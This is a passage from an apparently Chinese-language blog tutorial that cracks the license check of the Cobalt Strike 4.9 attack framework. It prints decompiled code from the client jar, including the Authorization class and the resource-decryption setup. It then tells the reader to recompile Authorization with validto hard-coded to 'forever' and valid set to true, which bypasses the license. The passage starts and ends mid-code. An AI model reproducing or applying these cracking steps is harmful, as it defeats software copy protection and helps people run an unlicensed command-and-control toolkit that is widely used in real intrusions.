punctuation">&#123;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Your authorization file is not valid: "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your authorization file is not valid.\n"</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var0<span class="token punctuation">.</span><span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Your Cobalt Strike license is expired. Please contact cobalt.custops@helpsystems.com to renew. If you did renew, run the update program to refresh your authorization file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your Cobalt Strike license is expired.\nPlease contact cobalt.custops@helpsystems.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_warn</span><span class="token punctuation">(</span><span class="token string">"Your Cobalt Strike license expires "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">". Email cobalt.custops@helpsystems.com to renew. If you did renew, run the update program to refresh your authorization file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Your Cobalt Strike license expires "</span> <span class="token operator">+</span> var0<span class="token punctuation">.</span><span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nEmail cobalt.custops@helpsystems.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file."</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span></code></pre><p>我们去Authorization类看看。此类为核心校验类校验是否是正版还是试用版本。通过Authorization构造函数进行校验。</p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Authorization</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">common</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Calendar</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Authorization</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Authorization</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> var1 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">canonicalize</span><span class="token punctuation">(</span><span class="token string">"cobaltstrike.auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProtectionDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCodeSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var2 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"cobaltstrike.auth"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"trouble locating auth file"</span><span class="token punctuation">,</span> var11<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Could not read "</span> <span class="token operator">+</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">AuthCrypto</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">DataParser</span> var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataParser</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                    var5<span class="token punctuation">.</span><span class="token function">big</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    var5<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span> var7 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> var9 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> <span class="token number">49</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">29999999</span> <span class="token operator">==</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span>                        <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"valid to"</span><span class="token punctuation">,</span> <span class="token string">"perpetual"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">=</span> <span class="token string">"Valid to date ("</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">") is invalid"</span><span class="token punctuation">;</span>                            <span class="token keyword">return</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>validto <span class="token operator">=</span> <span class="token string">"20"</span> <span class="token operator">+</span> var8<span class="token punctuation">;</span>                        <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"valid to"</span><span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">systemDetail</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> var9 <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"auth file parsing"</span><span class="token punctuation">,</span> var10<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">></span> <span class="token number">999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> var2 <span class="token operator">=</span> <span class="token number">2000</span> <span class="token operator">+</span> var1 <span class="token operator">/</span> <span class="token number">10000</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var3 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var4 <span class="token operator">=</span> var1 <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> var5 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">></span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Calendar</span> var7 <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var7<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var7<span class="token punctuation">.</span><span class="token function">setLenient</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    var7<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                    var7<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPerpetual</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"forever"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valid<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>error <span class="token operator">:</span> <span class="token string">"Authorization file is not for Cobalt Strike 4.9"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">parseDate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>validto<span class="token punctuation">,</span> <span class="token string">"yyyyMMdd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">whenExpires</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token number">1L</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"in 1 day ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> var1 <span class="token operator">&lt;=</span> <span class="token number">0L</span> <span class="token operator">?</span> <span class="token string">"TODAY ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span> <span class="token operator">:</span> <span class="token string">"in "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" days ("</span> <span class="token operator">+</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">formatDateAny</span><span class="token punctuation">(</span><span class="token string">"MMMMM d, YYYY"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAlmostExpired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">long</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> var1 <span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExpirationDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token keyword">int</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">86400000L</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>var0<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>我们把要修改的类拷贝到src目录里面csproject\src\common\Authorization.java<br>我们看他的属性一个一个分析填入值  protected String validto &#x3D; “”;我们看这个为forever我们修改一下属性为forever<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101628300.png" alt="如图"><br>前天两个属性同样的方式改成<br>protected String error &#x3D; null; &#x2F;&#x2F;这个不用动<br>protected boolean valid &#x3D; true;</p><p>所以我们改成了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">String</span> validto <span class="token operator">=</span> <span class="token string">"forever"</span><span class="token punctuation">;</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span> error <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">protected</span> <span class="token keyword">boolean</span> valid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></code></pre><p>继续看代码 SleevedResource.Setup(var6);<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101632683.png" alt="如图"><br>这个代码是干啥的我们来分析一下</p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Setup</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token class-name">SleeveSecurity</span> <span class="token class-name">A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化 SleeveSecurity 并且调用 registerKey</span>        <span class="token keyword">private</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">.</span><span class="token function">registerKey</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\dns\<span class="token class-name">SleeveSecurity</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token keyword">public</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1 <span class="token operator">=</span> <span class="token string">"abcdefghijklmnop"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IvParameterSpec</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span> <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token 